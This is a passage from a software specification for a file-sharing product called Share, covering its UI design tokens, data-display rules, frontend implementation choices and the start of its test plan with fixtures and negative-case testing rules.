| **kind: bundle** | `folder-open` | |
| **kind: page** | `file-code-2` | |
| **kind: document** | `file-text` | |
| **kind: image** | `image` | |
| **kind: video** | `file-video` | Never `play` — this is a file, not a player. |
| **kind: file** | `file` | The fallback. |
| **version** | `git-commit-horizontal` | A single version. The versions *list* and tab use `history`. |
| **trash** | `trash-2` | The screen, the verb "Move to trash", and the `In trash` badge. |
| **restore** | `rotate-ccw` | Restoring from trash and rolling back to an older version. |
| **copy** (clipboard) | `copy` | Swaps to `check` on success. |
| **copy to my space** (duplicate) | `copy-plus` | Deliberately distinct from clipboard copy; §7.7.1's action, and the two appear in the same menu. |
| **tag** | `tag` | |
| **token** (API token) | `key-square` | Square, versus `key-round` for a link password. The two never appear on the same screen. |
| **passkey** | `fingerprint` | Never a key icon — a passkey is not a token, and the audit log must not blur them. |
| **session** | `monitor-smartphone` | A signed-in device on 11.19. |
| **audit** | `scroll-text` | |
| **search** | `search` | |
| **upload** (post) | `upload` | The verb for putting bytes in — never "publish", and never a globe. |
| **download** | `download` | |
| **grant** (verb: share with a user) | `user-plus` | |
| **revoke** (verb: link or grant) | `circle-slash` | The same icon for both, because they are the same act — ending someone's access — and reusing it makes the pattern learnable. Rendered in `--text-secondary`, not red (§13.6.1). |
| **user** | `user-round` | The users *list* (11.22) uses `users-round`. |
| **quota / storage** | `hard-drive` | The screen, the meter's label, and the over-quota banner. |
| **stale** (not opened recently) | `clock-alert` | Screen 11.24 only. |
| **agent** | `bot` | The help page (11.27) and any row whose actor is a token acting on an agent's behalf. |

Supporting icons, fixed by convention and used nowhere unexpected: `check` (success, selected),
`circle-check` (success banner), `triangle-alert` (warning), `octagon-alert` (danger, error),
`info` (info banner), `settings` (settings), `eye` / `eye-off` (show or hide a password),
`folder` / `file` (file tree), `arrow-up-right` (opens in a new tab), `ellipsis` (overflow
menu), `chevron-*` (disclosure and sort), `x` (dismiss), `plus` (create), `corner-down-right`
(entry point), `server-cog` (system actor), `loader-circle` (spinner), `panel-left` (sidebar
collapse), `sun` / `monitor` / `moon` (the theme control).

---

## 13.8 Motion

### 13.8.1 Tokens

```css
--duration-instant:    0ms;
--duration-fast:     120ms;   /* hover, focus, checkbox, toggle thumb */
--duration-base:     180ms;   /* the default: fades, colour swaps, toasts */
--duration-slow:     240ms;   /* drawers, progress fill, tree expansion */
--duration-deliberate: 320ms; /* nothing in phase 1; reserved */

--ease-standard: cubic-bezier(0.2, 0, 0, 1);     /* on-screen movement */
--ease-out:      cubic-bezier(0.16, 1, 0.3, 1);  /* entering */
--ease-in:       cubic-bezier(0.4, 0, 1, 1);     /* exiting */
--ease-linear:   linear;                          /* spinners and indeterminate bars only */
```

### 13.8.2 What animates

| Thing | Animation |
| --- | --- |
| Hover, focus, pressed | `background-color`, `border-color`, `color`, `box-shadow` over `--duration-fast --ease-standard` |
| Dialog | Overlay `opacity` 0→1 over `--duration-base`. Panel `opacity` 0→1 with `scale(0.98)→1` and `translateY(4px)→0` over 200ms `--ease-out`. Exit 120ms `--ease-in`, no scale. |
| Drawer | `translateX(100%)→0` over `--duration-slow --ease-out`; exit `--duration-base --ease-in` |
| Dropdown, popover, tooltip | `opacity` plus `scale(0.96)→1` from the trigger-adjacent origin, `--duration-fast --ease-out` |
| Toast | `translateY(8px)→0` plus fade, `--duration-base --ease-out`; exit is fade only |
| Tree and accordion expansion | `height`, via `grid-template-rows`, over `--duration-slow --ease-standard` |
| Sharing-state change | Badge cross-fade `--duration-base`; the row or header flashes `--bg-selected` → transparent over 600ms |
| Route change | `opacity` 0→1 on the content region only, `--duration-fast`. The shell never animates. |
| Spinner | `rotate` 360° over 800ms, `--ease-linear`, infinite |
| Indeterminate progress | `translateX` sweep over 1,200ms, `--ease-standard`, infinite |
| Skeleton shimmer | `background-position` over 1,400ms, `--ease-linear`, infinite |

### 13.8.3 What must not animate

- **The sharing-state indicator must never pulse, glow, blink, or loop.** A throbbing
  link-active badge would be noise within an hour and ignored within a day, and the whole design
  depends on it still being noticed in month six. It changes once, calmly, and then holds still.
- **Nothing in the viewer animates.** No fade-in on the artifact, no transition between files in
  a bundle, no zoom easing on an image. Rendered content appears when it is ready; an animation
  over somebody else's document is the chrome talking over the content (D3).
- Numbers never count up. A stat tile renders its final value; view counts and quota figures
  appear at rest.
- Table rows do not animate on sort, filter, or reorder, and rows appended by "Load more" do not
  slide in.
- Nothing animates on scroll: no parallax, no reveal, no sticky-header height change.
- Skeletons never cross-fade into content — the swap is instantaneous, and invisible because the
  boxes are the same size.
- No page-load or first-mount animation of any kind.
- Buttons do not scale, lift, or ripple on press. They change background colour.

### 13.8.4 Reduced motion

```css
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

With these exceptions, implemented as explicit overrides rather than by weakening the rule:

1. **Opacity-only transitions stay, at 100ms.** Fading is not vestibular motion, and an
   instantaneous dialog is disorienting in a different way.
2. **All `transform` is removed** — dialogs, drawers, toasts, and menus appear at their final
   position with a fade only.
3. **The spinner keeps rotating.** It is small, local, and the only remaining signal that
   something is happening. Every other infinite animation stops.
4. **The indeterminate progress bar** becomes a static 30% fill with the state in its caption.
5. **The sharing-change row flash** becomes a 2px `--focus-ring-color` left border held for 3
   seconds.
6. **The skeleton shimmer** becomes a flat `--bg-sunken`.

The preference is also read through `matchMedia` so behaviour can branch and not just CSS —
"Load more" scroll management uses `auto` rather than `smooth`.

---

## 13.9 Data display conventions

Rendering rules, not suggestions. Two screens showing the same value must show identical
characters.

### 13.9.1 Byte sizes

Base 10 — `KB` is 1,000 bytes — matching what the disk vendor and the host's dashboard say.
Never `KiB` in the UI. The API always returns raw integers.

| Range | Format | Example |
| --- | --- | --- |
| 0 | `0 bytes` | `0 bytes` |
| 1–999 | integer + ` bytes` | `812 bytes` |
| < 10 of a unit | one decimal | `9.4 MB`, `1.0 KB` |
| ≥ 10 of a unit | no decimals | `24 MB`, `147 KB` |
| ≥ 1,000 of a unit | promote | `1,204 MB` → `1.2 GB` |

Units: `bytes`, `KB`, `MB`, `GB`, `TB`, always space-separated, always `tabular-nums`,
right-aligned in tables. A summed size — a version total, an artifact total, the trash total —
renders identically and never with a `~`, because Share knows these numbers exactly.

**Deduplicated sizes are labelled.** Because identical bytes are stored once instance-wide
(§1.7, principle 7), an artifact's displayed size is the size of its files, while the quota
figure counts unique bytes. Where the two appear together the smaller carries a `--type-sm`
`--text-tertiary` note: `24 MB · 3 MB unique`. Never one number pretending to be both.

### 13.9.2 Dates and times

Absolute: **`24 Aug 2026, 15:04`** — day, abbreviated month, four-digit year, comma, 24-hour
clock, in the viewer's local zone. The year is omitted within the current year
(`24 Aug, 15:04`). Seconds appear only in the audit log, as `15:04:32`.

Relative: `just now`, `4 min ago`, `3 hr ago`, `2 days ago`, `6 days ago`; future forms
`in 4 min`, `in 6 days`. Never "yesterday", never "a while ago", never "recently".

| Where | Rendering |
| --- | --- |
| Table timestamp columns (created, updated, last opened) | Relative within 7 days, absolute beyond. The `title` attribute always carries the full ISO 8601 UTC value. |
| Audit log (11.23) | **Always absolute, with seconds.** An audit trail with relative times is not a trail. |
| Version list | Relative within 7 days, absolute beyond, plus the actor. |
| View counts by day (11.7) | Absolute dates, always. |
| Trash | `Deleted 2 days ago · removed permanently on 23 Sep 2026, 00:00` — relative for the past act, absolute for the deadline. |
| **Any expiry** | **Always absolute, with the relative form as a parenthetical hint.** |

**The expiry rule.** Anywhere a share link's expiry appears — the expiry chip, the artifact
header, the create-link dialog, the sharing panel, the expiring-soon banner, the email in §12.9,
a rendered API response — the primary rendering is the absolute datetime. The relative form may
follow in parentheses in `--text-tertiary`, but never replaces it.

```
Expires 7 Sep 2026, 18:04 (in 6 days)      ✓
Expires in 6 days                           ✗
Expires in 6 days (7 Sep 2026, 18:04)       ✗   — the absolute form must lead
```

"In 6 days" is a fact about *now*, and this screen may be read tomorrow, screenshotted today, or
pasted into an email on Friday; only the absolute form survives being moved. In the expiry chip,
where space is tight, the parenthetical drops to the tooltip — the absolute form stays.

Time zone: rendered local, with the zone abbreviation appended for **expiries and audit
timestamps** (`7 Sep 2026, 18:04 BST`) and omitted elsewhere. Every timestamp's `title` carries
the ISO 8601 UTC string, and every `<time>` element carries a machine-readable `datetime`.

### 13.9.3 Durations

| Range | Format | Example |
| --- | --- | --- |
| < 1,000 ms | integer + ` ms` | `340 ms` |
| 1–60 s | one decimal + ` s` | `1.2 s` |
| 1–60 min | `Xm Ys` | `2m 05s` |
| ≥ 1 hr | `Xh Ym` | `3h 12m` |
| ≥ 1 day (TTLs, retention) | `X days` | `14 days` |

TTL **inputs** use the API's duration strings verbatim, in monospace — `30m`, `24h`, `14d`,
`180d` — so what the dashboard shows is exactly what someone would type into the CLI. TTL
**outputs** in prose use the long form: "This link lasts 14 days."

### 13.9.4 Counts

Locale thousands separators (`1,204`). **Never abbreviated in tables** — a cell reading `12.4k`
cannot be reconciled against an export. Abbreviation (`12.4k`, `1.2M`) is permitted only in stat
tiles, with the exact value in the tooltip. Zero renders as `0`, never an em dash and never
"None". A count that is a pagination lower bound renders `50+`, never `~50`.

**View counts** carry their unit because they are estimates of people, not requests:
`14 views · 6 viewers` where the first is a request count and the second is the
HyperLogLog-derived distinct-viewer estimate for the day (§10.6). The viewer figure always
carries the tooltip "An estimate. Share does not store who viewed this." Never a precise-looking
number for an estimated quantity, and never a viewer list, which does not exist and cannot be
made to exist.

### 13.9.5 Empty and null values

A genuinely absent value renders as an em dash `—` in `--text-tertiary` with
`aria-label="not set"`. Never `N/A`, never `null`, never `-`, and never an empty cell — an empty
cell is indistinguishable from a rendering failure.

A value absent *because a feature is off* renders the reason instead, at `--type-sm`
`--text-tertiary`: `No password`, `No description`, `Never opened`, `No links yet`.

A value absent *because we could not fetch it* renders `Unavailable` in `--state-danger-fg` with
a 12px `octagon-alert`. This case is never allowed to look like either of the two above, for the
same reason `unknown` exists on the sharing-state indicator.

### 13.9.6 Truncated names, tokens, and paths

| Kind | Rule |
| --- | --- |
| **Artifact name** | **Never truncated.** The name is the artifact's identity and the thing someone types into the CLI or the address bar. If a column cannot fit it, the column widens and something else gives. |
| **Share token** | First 8 and last 4 of the 22 base58 characters: `9fq2n4kw…TvQ8`. Both ends survive because a person comparing a token against an email checks the ends first. Full value in the `title` and in whatever the copy control copies. |
| **API token** | Prefix plus the last 4: `shr_…4f2a`. The middle is never shown after creation because the server does not have it. |
| **SHA-256** | First 7 characters, monospace: `9f2a1c4`. Full value in the `title`. Never the last N characters. |
| **Prefixed ID** | Prefix plus the first 6 of the ULID plus `…`: `lnk_01JAV3…`. The prefix always survives so the object type stays readable. |
| **File path** | Middle truncation preserving the full basename: `assets/…/app.css`. The filename is never truncated. |
| **Title, description, link label** | CSS `text-overflow: ellipsis` on one line, full value in a tooltip. This is the **only** place CSS truncation is permitted. |

Identifier truncation happens **in code, not in CSS**, so the DOM holds the truncated string and
a mouse selection yields exactly what is visible. The full value stays reachable through the
adjacent copy control, which always copies the untruncated string (§13.6.20).

### 13.9.7 URLs

Rendered in `--font-mono`, `--text-primary`, with the `https://` scheme **omitted** and any other
scheme shown. The path is included when non-root. A trailing slash on a root URL is dropped.

```
share.c52.com/postcal
share.c52.com/~sarah/q3/market-report
share.c52.com/s/9fq2n4kw…TvQ8
```

Every URL carries a copy control and, when reachable by the current viewer, an `arrow-up-right`
icon button opening it in a new tab with `rel="noopener noreferrer"`.

**The canonical URL and a share URL are always labelled and never adjacent without labels.** A
`--type-xs` `--text-tertiary` label sits above each (`Artifact URL` / `Share URL`), and the share
URL's copy field carries a 3px `--share-link-solid` left border. The distinction matters because
the two look similar and do entirely different things: one needs a sign-in, one is a bearer
credential that works for anyone. Sending the wrong one is the most consequential slip available
in this product, and labelling is the cheapest defence against it.

An unreachable URL — the artifact is trashed, the link is expired — renders at `--text-tertiary`
with the matching state badge and no open-in-new-tab button. It is not hidden; the owner needs to
know the address still exists and is dead.

---

## 13.10 Writing-in-UI rules that affect layout

Part 12 owns the words. These are the rules that constrain the boxes they go in; breaking one of
these breaks layout, not just tone.

**Sentence case everywhere** — buttons, headings, labels, column headers, menu items, tabs,
badges, toasts, dialog titles. Never Title Case, never ALL CAPS, never small caps. Capitalised:
the first word, proper nouns (Share, Postgres, Caddy, WebAuthn), and the sharing-state labels
**Private**, **Shared with n people**, **Link active**, and **Unknown**, which are capitalised as
state names in every position including mid-sentence.

**Button labels: 1–3 words, ≤24 characters, verb first.** `Create link`, `Revoke link`,
`Copy share URL`, `Move to trash`, `Load more`, `Delete forever`. Forbidden: `OK`, `Yes`, `No`,
`Submit`, `Click here`, and any label that does not name what happens. A label that will not fit
in 24 characters is naming two actions. **Buttons never wrap** — a button that would wrap is a
spec violation, and the fix is a shorter label, not a wider button. No trailing ellipsis on a
button that opens a dialog; that is a desktop convention this product does not use.

**Length caps.** Labels ≤3 words. Column headers ≤2 words. Section headings ≤5 words.
Empty-state headings ≤6 words. Empty-state bodies ≤2 sentences. Tooltips ≤80 characters. Toast
titles ≤60 characters; toast bodies wrap to at most 2 lines. Banner titles ≤60 characters.

**Field errors attach to the field.** The message renders directly beneath the field, 6px below,
at `--type-sm` in `--state-danger-fg`, preceded by a 14px `circle-alert`, with the field's border
switched to `--state-danger-solid` and `aria-invalid="true"` plus `aria-describedby` wired to the
message's id.

The message slot is a permanently reserved `min-height: 18px` box beneath every field, so showing
or clearing an error never reflows the form — this matters most in the create-link dialog, where a
reflow would move the confirm button under the cursor. The error **replaces** the helper text;
they never stack, and the helper text returns when the error clears. Messages wrap rather than
truncate, growing the slot downward.

Error text names the constraint and the fix in one sentence, without "Please" and without
"invalid" standing alone: `Names use lowercase letters, digits, hyphens, and slashes.`
`Passwords need at least 8 characters.` Server errors are mapped through §12.8; a raw API `code`
never reaches a field.

**Form-level errors** (request failed, quota exceeded, conflict) render as a `danger` banner at
the top of the form, inside the same scroll container, scrolled into view. On a server-side
validation failure, focus moves to the first invalid field and the banner summarises:
`2 fields need attention.`

**Terminology enforcement.** Per §12.2 the UI says *artifact*, *name*, *title*, *share link*,
*grant*, *revoke*, *post*, *version*, *trash*, *token*, *passkey*, *recipient*. It never says
*public*, *publish*, *deploy*, *go live*, *unpublish*, *file share*, *permissions*, *access
level*, or *visibility setting*. This is a layout rule as much as a copy rule: the alternatives
are different lengths and would break the fixed widths above, and "public" in particular would
misdescribe the guarantee (§13.6.8.1).

---

## 13.11 Implementation notes

### 13.11.1 Stack

**React 18 + TypeScript + Vite, with Radix UI primitives, plain CSS custom properties and CSS
Modules, TanStack Query for server state, and `lucide-react` for icons.**

Radix is chosen because this spec demands correct focus trapping, roving tabindex,
collision-aware positioning, and ARIA wiring across dialog, drawer, dropdown, select, tabs,
tooltip, and toast — seven components that are expensive to get right, unacceptable to get wrong,
and which Radix ships unstyled, leaving §13.6 the only source of visual truth. Plain CSS custom
properties rather than a utility framework is chosen because the same token block must be
**inlined verbatim** into the R1–R7 pages — Jinja templates emitted by FastAPI with no build
step, no JavaScript, and an 8 KB budget — and a utility framework's output cannot cross that
boundary while a token file can.

Supporting choices: React Router (URL-driven tabs, cursors, and filters), `zod` for form and
response validation, and no CSS-in-JS runtime. The initial-route budget is **250 KB gzipped**;
the syntax highlighter lazy-loads on the help and file-viewer routes only.

### 13.11.2 How tokens are consumed

`design/tokens.json` is the single source of truth. A build step (`npm run tokens`) emits three
artefacts and fails the build if any of them would drift:

1. `src/styles/tokens.css` — the complete three-layer block from §13.2.4.
2. `src/styles/tokens.d.ts` — a union type of every token name, so `var(--typo)` fails to
   compile.
3. `api/share/templates/_tokens.css.j2` — the recipient-page subset (surfaces, text, borders,
   focus, danger, password, expired), minified, for inlining.

Rules enforced in CI:

- **No raw colour values in component CSS.** `stylelint` blocks
  `/#([0-9a-fA-F]{3,8})\b|\brgba?\(/` outside `tokens.css`. One rule, no exceptions list.
- **No raw spacing values.** `declaration-property-value-allowed-list` restricts `padding`,
  `margin`, and `gap` to `var(--space-*)`, `0`, `auto`, and percentages.
- **Contrast is a test.** A Node script reads `tokens.json`, recomputes every pair in §13.2.5,
  and fails on any regression below its stated threshold.
- Components consume tokens through the global stylesheet only. There is no per-component theme
  object and no JavaScript token access except `getComputedStyle` where a chart needs a resolved
  colour.
- Tokens are additive-only within a phase; a rename ships with its codemod in the same commit.

### 13.11.3 Theme switching

Three states, in exactly this model:

| Setting | `data-theme` on `<html>` | Result |
| --- | --- | --- |
| `system` (**default**) | *no attribute* | `prefers-color-scheme` decides, live, with no reload |
| `light` | `data-theme="light"` | Light even on a dark OS — the `:not([data-theme="light"])` guard excludes the media block |
| `dark` | `data-theme="dark"` | Dark even on a light OS — the third block re-applies the overrides |

Mechanics:

1. The preference is stored in `localStorage` under `share.theme` **and** mirrored to a
   `share_theme` cookie (`SameSite=Lax`, `Secure`, `Path=/`, `Max-Age=31536000`, carrying nothing
   else), so the server can render R1–R7 in the chosen theme without JavaScript.
2. A blocking inline script in `index.html`'s `<head>`, before any stylesheet, reads that value
   and stamps `data-theme` when it is `light` or `dark`. About ten lines, wrapped in `try/catch`
   because private-mode browsers throw on storage access, and stamping nothing by default. This
   prevents the light-flash on a dark-OS reload.
3. `<meta name="color-scheme" content="light dark">` so native controls, scrollbars, and the
   address bar follow before CSS loads.
4. The top-bar control is a three-position segmented control (`sun` / `monitor` / `moon`), not a
   switch — `system` must be visible and selectable, and a binary toggle cannot express it.
5. Because `system` stamps no attribute, an OS switching to dark at sunset repaints the dashboard
   live. Nothing listens for a media-query change; the CSS does it.

The two dark blocks are generated from one source object, so a token cannot land in one and not
the other.

### 13.11.4 JavaScript: the dashboard versus the recipient pages

**The dashboard (11.1–11.28) requires JavaScript.** It is an authenticated operator tool behind a
passkey sign-in; a no-JS fallback would double the surface area for no user. Without JavaScript
it renders one centred `danger` banner from `<noscript>` saying so and linking to the CLI docs.

**Pages R1–R7 must work with JavaScript entirely disabled and must make no external request of
any kind.** This is a hard requirement, tested in Part 14.

| Page | No-JS behaviour |
| --- | --- |
| R1 Password gate | `<form method="post" action="/s/{token}/unlock">` with one password field and a submit button. `302` on success; re-renders with a field error on failure. No show/hide toggle, no strength meter. |
| R2 Share landing (non-HTML) | Static: the title if one is set, the kind tile, the byte size, a view link, and a download link. No name, no handle, no state indicator. |
| R3 Link expired or revoked | Static. One `timer-off` icon, one sentence, nothing else — it must reveal nothing about the artifact or its owner (§7.6). |
| R4 Not found · R5 Rate limited · R6 Maintenance | Static content, no interaction. R6 is served by Caddy from disk when the API is down, so it carries its own copy of the inlined CSS. |
| R7 File listing | A static `<ul>` of name, size, and type, each a plain link under `/s/{token}/…`. Sorted server-side. No tree, no JavaScript, no sorting controls. |

Construction rules, following from §6 and §1.6:

- **One inlined `<style>` block** — `_tokens.css.j2` plus roughly sixty lines of layout. No
  external stylesheet, no `<script>` of any kind, under **8 KB total** including the SVG. The
  budget is asserted by a byte-count test on the rendered output of every one of R1–R7.
- **No web fonts.** The system stack only. A request to a font CDN from R1 would tell a third
  party that a specific viewer, at a specific time, opened a specific person's private link —
  precisely the leak this product exists to close. That is also why Inter is self-hosted in the
  dashboard (§13.3.1): one rule everywhere.
- **No images, no favicons fetched from elsewhere, no analytics, no preconnect, no prefetch.**
  The only graphic is a single inline `<svg>` per page, with its path data pasted into the
  template.
- Theme comes from the `share_theme` cookie when present, otherwise `prefers-color-scheme`. Both
  dark blocks are present in the inlined CSS, so an explicit choice still wins.
- **No sharing-state indicator, no artifact name, no owner handle, no tags, no version count,
  no expiry** on any of R1–R7. These pages inherit tokens, type, and spacing from this design
  system, and nothing else. A recipient learns what they were given and not one fact more.

### 13.11.5 Accessibility baseline

Every screen ships meeting these, and Part 14 asserts them:

- WCAG 2.1 AA contrast for all text and all non-text indicators, per the §13.2.5 audit, in both
  themes.
- A visible `:focus-visible` ring on every interactive element; no `outline: none` without an
  equally visible replacement.
- Full keyboard operability — the file tree, the command palette, tables with row actions, the
  viewer, and every dialog. No positive `tabindex` anywhere.
- Landmarks: one `<nav>` (sidebar), one `<main>` (content region), one `<header>` (top bar), and
  a "Skip to content" link as the first focusable element.
- Every state conveyed by colour is also conveyed by an icon and a word (D4), including in
  print and in greyscale.
- `prefers-reduced-motion` honoured per §13.8.4.
- Live regions used sparingly: toasts (`polite`), form-error summaries (`assertive`), copy
  confirmations (`polite`), and the sharing-state indicator on the three screens named in
  §13.6.8.7. Nowhere else.
- Usable at 200% zoom and at 320px CSS width with no horizontal page scrolling — wide tables
  scroll inside their own container, never the body.
- The viewer's `iframe` carries `title="Artifact content"` so a screen reader announces the frame
  boundary, and the sandboxed content is never made a focus trap.

---

# Part 14 — Test Plan and Acceptance Criteria

## 14.1 Philosophy and levels

This part is the contract between the specification and the implementation. A feature is not
finished when it works; it is finished when the tests named here for it exist, run in CI, and
pass. Where a test in this part contradicts prose elsewhere in the spec, **the test wins for
implementation purposes** and the discrepancy is recorded per §1.9 — the ones already found
while writing this part are in §14.24.

Every test ID in this part is referenced from somewhere else in the spec or is reachable from
one that is. Part 1 cites `T-PRIV-01…09` (§1.6.3), Part 4 cites `T-SEC-07` (§4.7), Part 6 cites
`T-PRIV-01` (§6.5.2), and Part 7 cites `T-EXP-02` (§7.5). Those citations are load-bearing and
the IDs below match them exactly.

### 14.1.1 The four levels

| Level | Runs against | Belongs here | Budget |
| --- | --- | --- | --- |
| **Unit** | Pure functions, no I/O | Path normalisation (§6.4), name validation and generation (§5.3), duration parsing, content-type derivation (§6.6.3), manifest diffing (§8.2), entry-path resolution (§5.5), longest-prefix candidate enumeration (§6.5.1), rate-limit bucket arithmetic (§10.2), `can_view` (§6.5), cache-control computation (§6.6.5), cookie-name derivation (§4.7) | < 10 ms |
| **Integration** | Real Postgres, real Redis, real file root; the API called in-process over an ASGI transport | Every endpoint, every error code in Parts 4–10, transactions, reference counting, worker jobs, idempotency, audit writes, quota accounting | < 2 s |
| **End-to-end** | Real Caddy over a real UNIX socket in front of a real API, real TLS against a local CA | Anything where Caddy's behaviour is load-bearing: `X-Share-*` stripping, `forward_auth`, `copy_headers`, `file_server`, `precompressed`, `Range`, the constant security headers, gate and error pages | < 10 s |
| **`@security`** | The integration or e2e harness, marked | Traversal, spoofing, enumeration and timing oracles, CSRF, credential-class confusion, quarantine, signature tampering, WebAuthn abuse | any |

`@security` is a **marker, not a stack**. A security test may run at any of the three levels.
The marker exists so CI can enforce §14.22.4 — a failing security test blocks a merge
unconditionally, and an unrun one counts as failing.

### 14.1.2 What may never be mocked

- **PostgreSQL.** Partial unique indexes (`artifact (user_id, name) WHERE deleted_at IS NULL`),
  the `expiry_required` check on `share_link`, the `one_root_user` index, `ON CONFLICT`
  semantics on `file`, and the `INSERT, SELECT`-only grant on `audit_event` are part of the
  correctness argument (§3.3, §3.4, §3.7, §3.8). A repository double proves nothing about them.
- **Redis.** Token-bucket refill, TTL expiry, stream semantics, HyperLogLog cardinality, and the
  `DEL`-on-revocation contract (§2.4.2) are behaviours, not interfaces. `fakeredis` is banned by
  a lint rule.
- **The filesystem's atomic-rename boundary.** The write protocol in §3.5 — stream to
  `SHARE_TMP_ROOT`, hash incrementally, `fsync`, `rename()` into `SHARE_FILE_ROOT`, `fsync` the
  directory — is the whole durability and partial-read argument. A `tmpfs` mount is acceptable;
  an in-memory filesystem abstraction is not, because it cannot fail a cross-device rename.
- **argon2.** Real argon2id at the real parameters (`m=64MiB, t=3, p=1`) for share-link
  passwords and recovery codes (§7.3, §4.5). A stubbed KDF hides a parameter misconfiguration
  that only appears in production, and it hides the timing profile that §14.5 measures.
- **WebAuthn verification.** The real `webauthn` library performing real signature, challenge,
  origin, RP ID, and counter checks (§4.3). Tests drive it with a software authenticator
  (§14.2.7), never by patching the verifier's return value.
- **Caddy**, for anything at e2e level. Header stripping (§2.4), `copy_headers`, `Range`
  handling, and `precompressed` are Caddy behaviours the API depends on and cannot self-test.

Acceptable to fake: SMTP (a sink, §14.2.6), the clock (§14.2.4), ULID and token generation
(§14.2.5), and the headless browser used for the SVG and framing assertions.

### 14.1.3 The negative-case rule

**Every endpoint in Parts 4–10 carries three mandatory negative tests.** Not "where
applicable" — three, for all of them.

1. **Permission denial.** The endpoint called with a credential that authenticates but does not
   authorise: a token missing the required scope, a session belonging to another user, a
   recipient session, a token whose owner is disabled, an artifact name in another space.
   Asserts the exact status and the exact `code` from that endpoint's error table (§5.12, §6.8,
   §7.10, §8.9, §4.9, §10.9) — never merely "4xx".
2. **Limit breach.** The endpoint driven past whichever ceiling applies: a rate-limit bucket
   from §10.2, a storage quota from §10.3, a body ceiling from §5.1.4, or a count ceiling
   (files per version, tags per artifact, archive entries, concurrent uploads). Asserts the
   status, the `code`, `detail.bucket` for `429 rate_limited`, the presence of `Retry-After`,
   `X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset` on every `429`, and
   `detail.currentBytes` / `projectedBytes` / `quotaBytes` on every `413 quota_exceeded`.
3. **Malformed input.** A body or query violating the schema: wrong JSON type, missing required
   field, unknown field, over-length string, invalid enum, an unparseable duration, and — for
   anything path-shaped — a traversal attempt. Asserts `422` with
   `detail.fields[].path` / `.code` per §5.1.1.

Enforcement is itself a test, not a review convention:

**T-SEC-00 — negative-coverage reflection.** *Unit.* Import the FastAPI application, walk
`app.routes`, and build the set of `(method, path_format)` pairs excluding `/internal/health`,
`/internal/ready`, and `OPTIONS`/`HEAD` auto-routes. Walk the collected test suite and read the
`@covers(method, path, kind)` decorator on every test. Assert that for each route all three
`kind` values (`permission`, `limit`, `malformed`) appear at least once. **Fails the build with
a list of uncovered `(route, kind)` pairs.** A route that genuinely cannot breach a limit — the
health probes are the only ones expected — must be added to an explicit `NO_LIMIT_ROUTES` list
in the test file with a one-line justification, and the test asserts that list is non-growing
relative to a checked-in count.

### 14.1.4 Assertion style

Assertions name exact values. `assert r.status_code == 404 and r.json()["error"]["code"] ==
"not_found"`, not `assert not r.ok`. Byte-identity assertions compare `r.content` and the full
sorted header list minus `Date`. Timing assertions state sample size, statistic, and threshold.
Nothing in this part is satisfied by "check it works".

## 14.2 Test environment

### 14.2.1 Standing up an instance

A session-scoped fixture brings up, per worker process:

- **PostgreSQL 16**, a fresh database per xdist worker (`share_test_gw0`, …), `citext` and
  `pg_trgm` created, migrated to head with Alembic. Each test runs inside a transaction rolled
  back at teardown, except tests marked `@commit_required` (worker jobs, `LISTEN`-free
  cross-connection visibility, `FOR UPDATE SKIP LOCKED` collection), which get a truncate-based
  reset instead.
- **Redis 7**, a dedicated numbered database per worker, `FLUSHDB` between tests.
- **An ephemeral file root.** `SHARE_FILE_ROOT=$TMP/files`, `SHARE_TMP_ROOT=$TMP/tmp`,
  `$TMP/quarantine`. **At session start the fixture asserts
  `os.stat(file_root).st_dev == os.stat(tmp_root).st_dev` and aborts the entire session with a
  named error if they differ** — a cross-device tmp root turns every `rename()` into a copy and
  silently invalidates the atomicity argument in §3.5. It also asserts the root is writable by
  the test user and that the mode of a written blob is `0640`.
- **Caddy 2.8+**, for `@e2e` only: the §2.4 Caddyfile with `share.c52.com` replaced by
  `share.test`, `tls internal`, and the socket path pointed at the harness. `share.test`
  resolves through the client's own resolver override, not `/etc/hosts`. The e2e client trusts
  Caddy's internal CA and nothing else.

### 14.2.2 Environment under test

Ceilings are lowered so limits are reachable in a test, and every test that depends on a
ceiling reads it from settings rather than hard-coding the number:

| Variable | Test value | Why |
| --- | --- | --- |
| `SHARE_HOST` | `share.test` | Also the WebAuthn RP ID |
| `SHARE_MAX_FILE_BYTES` | `10485760` (10 MB) | Reachable without moving gigabytes |
| `SHARE_MAX_ARTIFACT_BYTES` | `52428800` (50 MB) | |
| `SHARE_MAX_FILES_PER_VERSION` | `5000` | **Not lowered** — the 5,000-file case is a real target (§14.20) |
| `SHARE_USER_QUOTA_BYTES` | `104857600` (100 MB) | Quota breach in three posts |
| `SHARE_DEFAULT_SHARE_TTL` | `14d` | Production value; expiry tests move the clock |
| `SHARE_MAX_SHARE_TTL` | `180d` | Production value |
| `SHARE_TRASH_DAYS` | `30` | Production value |

A dedicated test asserts that no other production default is overridden: **T-OPS-12** diffs the
test `Settings` object against `Settings()` defaults and fails on any key not in the table
above. A test suite that quietly weakens a production ceiling proves the wrong system.

### 14.2.3 Deterministic IDs and tokens

`share.ids.new_id(prefix)` and `share.crypto.token_bytes(n)` are the only two generators, and
both read from a `Randomness` provider resolved at call time. In tests the provider is seeded
per test with the test's node ID, so:

- ULIDs are reproducible and still monotonic within a test, keeping cursor pagination
  assertions exact.
- Share tokens, API tokens, session tokens, recovery codes, upload-session signatures, and
  generated names are all reproducible, so a test can assert a literal URL.
- A `@real_entropy` marker restores the CSPRNG for the two tests that measure entropy itself
  (T-SEC-19, T-SHARE-04).

A lint rule bans `secrets.`, `random.`, `os.urandom`, and `uuid.` outside `share/crypto.py` and
`share/ids.py`.

### 14.2.4 The injected clock

All time reads go through `share.clock.now()` and `share.clock.monotonic()`. **A lint rule
(`flake8-share-clock`) fails the build on any direct `datetime.now`, `datetime.utcnow`,
`time.time`, `time.monotonic`, or `date.today` outside `share/clock.py`**, including in tests.
SQL is covered separately: a second lint rule bans `now()` and `CURRENT_TIMESTAMP` in
application SQL and in migrations that write data, requiring a bound parameter instead — except
in `DEFAULT` clauses, which are exercised only by tests that do not depend on the value.

The fixture `clock` offers `set(instant)`, `advance(delta)`, and `freeze()`. Postgres is kept in
step by `SET LOCAL share.now = …` read by a session-scoped `share_now()` SQL function that the
expiry sweeps use, so a moved clock moves both sides. Tests that assert "the sweep has not run"
(T-EXP-02) advance the clock **without** running the worker, which is only sound because the
worker is invoked explicitly in tests, never by a background scheduler.

